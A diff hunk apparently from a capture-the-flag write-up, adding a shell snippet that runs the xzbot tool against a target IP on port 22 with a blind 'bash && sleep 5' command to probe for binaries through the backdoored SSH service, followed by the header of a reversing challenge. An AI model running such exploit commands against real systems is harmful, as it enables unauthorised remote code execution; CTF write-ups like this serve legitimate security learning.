@@ -475,6 +475,11 @@ Wrote go code to brute force key from random number range, used xybot xploit to 
 
 Used sleep + && to determine which binaries were on system, all blind execution
 
+```sh
+# Figure out what binaries are on the system
+~/go/bin/xzbot -addr 52.207.201.51:22 -seed 313337 -cmd "bash && sleep 5"
+```
+
 ### Reversing 500-1 - "Joshua"
 
 > We've been locked out of the WOPR can you break in? Here's a copy of the binary. WOPR is located here \[xx.54.155.107\]
